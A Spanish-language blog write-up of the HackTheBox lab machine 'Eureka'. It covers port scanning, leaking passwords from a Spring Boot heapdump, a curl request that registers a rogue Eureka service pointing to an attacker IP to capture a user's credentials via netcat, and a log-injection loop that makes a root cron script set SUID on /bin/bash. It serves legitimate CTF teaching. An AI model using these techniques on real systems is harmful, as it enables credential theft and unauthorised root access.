---
layout: post
title:  "Writeup Eureka"
date:   2025-08-30
categories: [Writeup, HackTheBox]
tags: [Linux, Dificil]
image: /images/writeup-eureka/Pasted image 20250704002743.png
---


***Dificultad: Dificil***

***Sistema Operativo: Linux***

---------------------------------------------------------
\
La máquina de hoy, se enfoca en la explotación de vulnerabilidades en aplicaciones Spring Boot, La enumeración identifica endpoints expuestos, que permite obtener credenciales sensibles. Estas credenciales facilitan el acceso inicial al sistema como el usuario "oscar190". Desde allí, se explota una vulnerabilidad en el servicio Eureka mediante un registro malicioso, logrando escalar privilegios a un usuario más privilegiado, "miranda". Finalmente, se establece una reverse shell para obtener acceso root, explotando configuraciones inseguras de un archivo con poca sanitizacion y aprovechando una tarea cron de ROOT.

--------------------------------------------------------

## Enumeracion

primero vamos a enumerar puertos en la ip con nmap:
```bash
nmap -p- --open -sS -Pn -n -vvv --min-rate 2000 10.129.232.59 -oN puertos
```

el primero escaneo nos muestra:
```nmap
Not shown: 43604 closed tcp ports (reset), 21929 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
```

escaneando lo puertos de nuevo pero sin un "min-rate" tenemos otro puerto:
```
8761/tcp open  unknown syn-ack ttl 63
```

ahora, vamos a capturar versiones y servicios que esten corriendo en esos puertos:
```
nmap -p22,80,8761 -sCV -n -Pn 10.129.232.59 -oN servicios
```


cosas interesantes se nos revelan:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8761/tcp open  http    Apache Tomcat (language: en)
| http-auth: 
| HTTP/1.1 401 \x0D
|_  Basic realm=Realm
|_http-title: Site doesn't have a title.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
ssh: podríamos intentar fuerza bruta, pero sin usuarios posibles o contraseñas, no vale la pena (además que acabaríamos bloqueados)

80: una web con dominio *furni.htb* corriendo en nginx 1.18.0

8761: parece un panel de autenticacion corriendo en apache tomcat (muy observador eh!), sin titulo ni nada mas

llama mi atencion ese panel, miraremos primero que hay alli:
<img src="/images/writeup-eureka/Pasted image 20250707202947.png" alt="image">

en efecto, pero no tenemos creds

vamos con la otra

primero, agregar el dominio a nuestro /etc/hosts:
```
10.129.232.59           furni.htb
```

buscando info de la web desde la terminal:
```bash
whatweb http://furni.htb
```

tenemos:
<img src="/images/writeup-eureka/Pasted image 20250707203517.png" alt="image">

*se hizo enumeración DNS sin éxito aparente*

despues de fuzzear algunos diccionarios, no tenia nada, asi que gracias a la comunidad, hice uso del siguiente diccionario:
```bash
ffuf -w -c /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u  http://furni.htb/FUZZ
```

Y AHORA:

<img src="/images/writeup-eureka/Pasted image 20250707212946.png" alt="image">

*nota: siempre probar mas alternativas de diccionario a las que se esta acostumbrado en las maquinas faciles o medias*

## Information Disclosure:

en http://furni.htb/actuator vemos:
<img src="/images/writeup-eureka/Pasted image 20250707214431.png" alt="image">


mirando y probando las urls, http:/furni.htb/actuator/heapdump ha descargado un archivo

<img src="/images/writeup-eureka/Pasted image 20250707220344.png" alt="image">


despues de buscar por mucho con el programa *visualVM* que es una interface grafica para ver volcaldos de memoria como este no encontre nada, intentando usar filtros y abriendolo, no tenia resultados al estar en hexdump, pero, convirtiendolo con *strings* y filtrando con grep la palabra "password" ya podia ver un poco mejor el contenido:

<img src="/images/writeup-eureka/Pasted image 20250707230436.png" alt="image">
(después de mirar todo, si.... todo haha, no habían credenciales o me podía haber saltado alguna)
intentando filtrar un poco mas use:
```bash
strings heapdump | grep "password:"
```
dado que solo se buscaba password y podría estar descartando alguna que le siguieran simbolos
<img src="/images/writeup-eureka/Pasted image 20250707230733.png" alt="image">

finalmente, cambiando ":" por "="

```bash
strings heapdump | grep "password="
```

<img src="/images/writeup-eureka/Pasted image 20250707231120.png" alt="image">

*nota: también podríamos haber indicado -i para que no fuera case sensitive, pero lo pensé luego, aunque de igual modo obtuvimos resultados satisfactorios :D*

credenciales finalmente:
```
user: oscar190 password: 0sc@r190_S0l!dP@sswd
```
<h3>Shell como Oscar:</h3>

probando las credenciales en la pagina del puerto 8761 no tenemos resultados, pero por ssh:
```bash
ssh oscar190@10.129.232.59
```

<img src="/images/writeup-eureka/Pasted image 20250708000943.png" alt="image">

(no creo que este sea el usuario, posiblemente haya que hacer movimiento lateral)

lo podemos confirmar, dado que en el home, no hay flag

no podemos listar permisos especiales, dado que sudo no esta habilitado para este usuario

en el home, tenemos otro directorio /home/miranda-wise posiblemente sea el usuario que debemos pivotar (pudimos mirar ese nombre varias veces en el archivo heapdump)

visitando el directorio donde se almacena el servidor, aplique un filtro con grep para buscar recursivamente en todos los directorios y archivos por la palabra "password", como en el archivo anterior:
```bash
cd /var/www/web
grep -iE -r "password"
```
y nos muestra un recurso que tiene una contrasena diferenta a la encontrada en el otro archivo pero para el mismo usuario oscar:
<img src="/images/writeup-eureka/Pasted image 20250708003548.png" alt="image">

si miramos ese archivo (el ultimo) que apararece en la imagen anterior tenemos en /var/www/web/Eureka-Server/src/mnain/resources/application.yaml:

<img src="/images/writeup-eureka/Pasted image 20250708003122.png" alt="image">

(estas si parecen las credenciales correctas para el panel de la web)
```
user: EurekaSrvr password: 0scarPWDisTheB3st
```
<h3>MisConfiguration y XSS:</h3>
usando las credenciales:

<img src="/images/writeup-eureka/Pasted image 20250708003747.png" alt="image">

al parecer no tenemos ninguna funcionalidad en la pagina, asi que voy a buscar cves relacionados a este servidor

*spring eureka server* es un servidor para la integración de microservicios, y asi pueden interactuar entre si

después de mucha lectura, consultas con chat-gpt, pruebas, algo de ayuda de la comunidad, finalmente tengo los pasos para la vulneracion de este servidor

lo primero, el el nombre, podemos buscar spring eureka server vulnerabilities en google y veremos:
<img src="/images/writeup-eureka/Pasted image 20250708213642.png" alt="image">
https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka

al mirar no eran vulnerabilidades en si, sino malas configuraciones, una de ellas, permitia reemplazar o inyectar un servicio malicioso en el servidor, y si algun usuario privilegiado lo visitaba, pues le robariamos las credenciales.

ahora, que me hizo pensar que esta vulnerabilidad podira funcionar?

dentro de la sesion ssh con oscar, mirando los logs del servidor, vemos algo bastante curioso al buscar al otro usuario o si habia mencion de el en las carpetas de la web (miranda)

con el comando:
```bash
grep -iE -r "miranda"
```
<img src="/images/writeup-eureka/Pasted image 20250708214716.png" alt="image">
hay una cantidad inusual de inicios de sesion ante *USER-MANAGEMENT-SERVICE* el cual es un servicio de el servidor eureka el cual ya tenemos credenciales:
<img src="/images/writeup-eureka/Pasted image 20250708215111.png" alt="image">

lo que nos hace pensar que hay alguna tarea cron programada para que el usuario visite específicamente ese servicio constantemente

en el articulo, la primera vulnerabilidad habla sobre ssrf, el cual nos serviria para ver alguna pagina oculta a la cual no llegamos, (no nos hace mucho sentido con lo que sabemos hasta ahora)

la segunda vulnerabilidad:
<img src="/images/writeup-eureka/Pasted image 20250708215745.png" alt="image">

robo de trafico y xss ( y sabemos que los xss nos siven para robar credenciales, cookies, etc) esto, mas los logs vistos, nos indica que podemos este ataque podemos intentarlo

en el mismo blog, nos dicen como podemos comunicarnos con el servidor para levantar o reemplazar un servicio desde una solicitud de burpsuite
<img src="/images/writeup-eureka/Pasted image 20250708220114.png" alt="image">

yo quise hacerlo desde la terminal con una solicitud curl, asi que pasando el json a un llm y detallando que era lo que quería hacer, además de que lo pulí un poco, basándome en el propio servicio que nos muestra la pagina:
<img src="/images/writeup-eureka/Pasted image 20250708220347.png" alt="image">
*puedes verlo visitando /eureka/apps/USER-MANAGEMENT-SERVICE*

después de varios fallos y limpiando un poco la solicitud mientras hacia pruebas, finalmente este fue el comando que me funciono:
```
 curl -k -X POST http://EurekaSrvr:0scarPWDisTheB3st@10.129.232.59:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H "Content-Type:application/json" -d '{
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "app": "USER-MANAGEMENT-SERVICE",
    "hostName": "<3vil ip aqui>",
    "ipAddr": "<3vil ip aqui>",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": {
      "$": 8081,
      "@enabled": "true"
    },
    "homePageUrl": "http://<3vil ip aqui>:8081/",
    "statusPageUrl": "http://<3vil ip aqui>:8081/status",
    "healthCheckUrl": "http://<3vil ip aqui>:8081/health",
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}'

```
*nota: donde indica "3vil ip aqui" es para evitar confusiones, alli va nuestra ip de atacantes*

antes de mandar la solicitud, estaremos en escucha con netcat, aunque en el blog nos indican usar una pagina maliciosa, no sera necesario en este caso, lo intente de ambos modos (con y sin pagina) y de igual modo recibiras la data robada:

comando netcat para estar en escucha:
```bash
nc -lnvp 8081
```

el servidor se vera de este modo:
<img src="/images/writeup-eureka/Pasted image 20250708221820.png" alt="image">

en un minuto recibiras respuesta

data recibida con un panel malicioso de inicio de sesion:
<img src="/images/writeup-eureka/Pasted image 20250708221941.png" alt="image">

data recibida sin panel malicioso:
<img src="/images/writeup-eureka/Pasted image 20250708222028.png" alt="image">
(como vemos, funciona en ambos casos)

## Shell como Miranda:

mirando la data que nos llega, son credenciales completas:
```data
username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve
```
aunque esta codificada a urlencode los caracteres especiales, podemos decodificarlos con el burpsuite en el decoder o con 
```
https://gchq.github.io/CyberChef/#recipe=URL_Decode(true)&input=SUwlMjF2ZVQwQmUlMjZCZVQwTDB2ZQ
```
finalmente:
```
usuario: miranda.wise contrasena: IL!veT0Be&BeT0L0ve
```

*nota: aunque el usuario que nos ha llegado sea miranda.wise, si miras el directorio home, veras que el el sistema estara como "miranda-wise", por si falla tu inicio de sesion con ssh*

ahora:
```bash
ssh miranda-wise@furni.htb
```

<img src="/images/writeup-eureka/Pasted image 20250708223912.png" alt="image">

tenemos la primera flag

## PrivEsc:

luego de mirar algunas cosas en el sistema y usando un script de monitoreo, para los comandos que se ejecutan en el sistema:
```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "command|procmon"
    old_process=$new_process
done
```

Podemos ver:
<img src="/images/writeup-eureka/Pasted image 20250709123319.png" alt="image">

y en el directorio /opt tenemos *log_analyse.sh*:

```bash
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi


analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}


analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}


analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}


display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))
        
        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}


# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```

es un script que pertenece a root, y que al pasarle un archivo .log lo analiza y deja un resultado:

<img src="/images/writeup-eureka/Pasted image 20250708235417.png" alt="image">

*nota: al ejecutarlo, aun no se muestra en el listado de comandos o de procesos ejecutados, ya sea con ps, o ss*

analizando el script, vemos que usa grep sin sanitizar y tambien awk

aqui probando crear mi propio archivo de logs, y metiendo comandos maliciosos entre ellos, como aqui:

<img src="/images/writeup-eureka/Pasted image 20250709003454.png" alt="image">

siempre se tomaban y se imprimian por pantalla:
<img src="/images/writeup-eureka/Pasted image 20250709012625.png" alt="image">

hasta que modifique los codigos de estado:
<img src="/images/writeup-eureka/Pasted image 20250709012724.png" alt="image">

el error era diferente ya que se espera un numero y se le esta pasando texto, pero lo importante es que logramos salirnos o desviar el flujo del programa

despues de algunas pruebas, vemos que debemos producir un error para salir del flujo y luego inyectar el comando malicioso

asi que probamos:

<img src="/images/writeup-eureka/Pasted image 20250709013317.png" alt="image">

 y no funciono, por que? porque al tener un numero entra en el filtro y causa error, pero, al inyectar:

<img src="/images/writeup-eureka/Pasted image 20250709013832.png" alt="image">

tenemos:

<img src="/images/writeup-eureka/Pasted image 20250709014024.png" alt="image">

el script ha ejecutado el comando

aunque, si miramos el archivo:

<img src="/images/writeup-eureka/Pasted image 20250709014331.png" alt="image">

tampoco podemos modificar como suid la bash:

<img src="/images/writeup-eureka/Pasted image 20250709014524.png" alt="image">

## Root:

el error era que miranda ejecutaba el script, aunque hay una tarea programada, para que cada cierto tiempo fuera root quien ejecutara el script pero al ejecutarlo nosotros se hace como el usuario
si hacemos un bucle que constantemente elimine el .log e inyecte el log malicioso, solo nos quedaria esperar a que sea root (o la tarea cron) el que ejecute el log_analyse.sh

asi que en el directorio /tmp cree y ejecute:
```bash
#!/bin/bash

while true; do
    rm -f /var/www/web/user-management-service/log/application.log
    
    echo 'HTTP Status: x[$(chmod u+s /bin/bash)]' > /var/www/web/user-management-service/log/application.log
    sleep 10
done
```


esperamos un par de minutos y finalmente:
```
bash -p
```
<img src="/images/writeup-eureka/Pasted image 20250709130619.png" alt="image">

------------------------------------------------------
\
nos vemos en la siguiente maquina! 

## H4ck th3 W0rld 

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">